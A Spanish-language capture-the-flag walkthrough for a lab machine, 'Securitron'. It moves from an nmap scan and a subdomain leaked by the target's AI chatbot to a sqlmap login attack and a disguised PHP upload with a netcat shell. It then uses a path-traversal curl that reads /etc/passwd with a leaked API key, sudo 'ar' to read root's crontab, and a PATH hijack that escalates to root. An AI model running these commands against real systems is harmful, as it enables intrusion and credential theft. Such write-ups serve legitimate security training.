Hacemos un escaneo de puertos con nmap:
![[Pasted image 20241008090850.png]]
En el puerto 80 vemos un chat, que tiene una especie de servicio de IA corriendo que tiene como titulo securitron.thl:
![[Pasted image 20241008090911.png]]
Si le pedimos que nos encuentre un subdominio de esta web, tenemos el siguiente `admin19-32.securitron.htl`:
![[Pasted image 20241008091651.png]]
Lo añadimos en el /etc/hosts:
![[Pasted image 20241008091825.png]]
Accedemos a dicho dominio desde el navegador:
![[Pasted image 20241007103213.png]]
Vamos a la parte de admin dashboard y vemos un panel de login:
![[Pasted image 20241008091857.png]]
Atacaremos dicho panel con sqlmap:
```bash
sqlmap -u 'http://admin19-32.securitron.thl/Admin/login.php' --dbs --batch --forms
```
![[Pasted image 20241007103423.png]]
Y vemos las siguientes bases de datos:
![[Pasted image 20241007103418.png]]
Hacemos el proceso de dumpeo de la base de datos con sqlmap:
```bash
admin:Ntpqc6Z7MDkG
```
![[Pasted image 20241007103448.png]]
Accedemos a la web con estas credenciales:
![[Pasted image 20241008092014.png]]
Y si vamos a la parte de dashboard, vemos que podemos subir una imagen y dicha imagen se pondrá en nuestro perfil:
![[Pasted image 20241007103547.png]]
Pero si lo intentamos subir vemos que no nos deja, por lo que tendremos que cambiar el content-type para hacer creer al servidor que va a recibir una imagen y no un archivo en php:
![[Pasted image 20241007103626.png]]
Nos ponemos en escucha con netcat y recibimos la conexión:
![[Pasted image 20241008092337.png]]
Una vez dentro, vamos a enumerar qué puertos están en funcionamiento, tanto los que escuchan como los que transmiten, y vemos el puerto 3000 que no conocemos:
```bash
ss -ano | grep tcp
```
![[Pasted image 20241008114310.png]]
Por lo que visualizamos el archivo de configuración del sitio para ver qué es exactamente este puerto:
```bash
/etc/apache2/sites-available/000-default.conf
```
Y vemos el chat en sí:
![[Pasted image 20241008114411.png]]
Entonces con el comando `ps aux | grep node` podremos ver cual es el archivo de backend de javascript que ejecuta este servicio; y lo encontramos:
```bash
ps aux | grep node
```
![[Pasted image 20241008114537.png]]
Visualizamos dicho archivo:
```bash
cat /home/securitybot/.local/bin/bot/index.js
```
Donde vemos una api-key:
```bash
imagine-no-heaven-no-countries-no-possessions
```
![[Pasted image 20241008115257.png]]



Pasando la api key y una ruta, podremos hacer uso del endpoint filename para leer el passwd:
```bash
curl -H "x-api-key: imagine-no-heaven-no-countries-no-possessions" http://localhost:3000/api/models/..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
```
![[Pasted image 20241008115813.png]]
Ahora intentamos leer el archivo user.txt:
```bash
curl -H "x-api-key: imagine-no-heaven-no-countries-no-possessions" http://localhost:3000/api/models/..%2F..%2F..%2F..%2F..%2F..%2Fhome%2Fsecuritybot%2Fuser.txt
```
Donde obtenemos una contraseña del usuario securitybot:
```bash
securitybot:0KjcFEkuUEXG
```
![[Pasted image 20241008115953.png]]
Una vez siendo el usuario securitybot, podemos ver que como root podemos ejecutar el comando ar:
![[Pasted image 20241008120059.png]]
Seguimos las instrucciones de gtfobins:
![[Pasted image 20241008120324.png]]
Y obtenemos lo siguiente:
![[Pasted image 20241008120341.png]]
Intentamos leer otros ficheros y encontramos algo muy interesante en el fichero de crontab del usuario root:
```bash
TF=$(mktemp -u) && sudo /usr/bin/ar r "$TF" "/var/spool/cron/crontabs/root" && cat "$TF"
```
Donde vemos que root ejecuta una tarea automática, que es la ejecución de un script pero le añade el comando date:
![[Pasted image 20241008120648.png]]
Pero tenemos que fijarnos en el path del crontab, donde vemos que pasa por `PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/home/securitybot/.local/bin:/usr/bin:/sbin:/bin` y por tanto dentro de securitybot/.local/bin podemos crearnos un date malicioso y así root cuando ejecute su tarea automática, pasará primero por el archivo date:
![[Pasted image 20241008121023.png]]
Lo guardamos y al rato veremos que la bash ya puede ser ejecutada como root gracias a que se le activó el bit SUID:
![[Pasted image 20241008121209.png]]
